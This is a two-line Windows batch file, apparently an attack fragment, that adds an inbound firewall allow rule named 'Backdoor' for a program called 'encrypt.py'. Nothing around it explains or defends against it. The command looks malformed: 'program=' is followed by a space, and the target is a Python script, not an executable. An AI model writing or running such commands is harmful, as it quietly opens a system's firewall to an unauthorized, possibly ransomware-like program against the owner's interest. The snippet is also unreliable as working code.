@Echo off
netsh advfirewall firewall add rule name=Backdoor dir=in action=allow program= encrypt.py enable=yes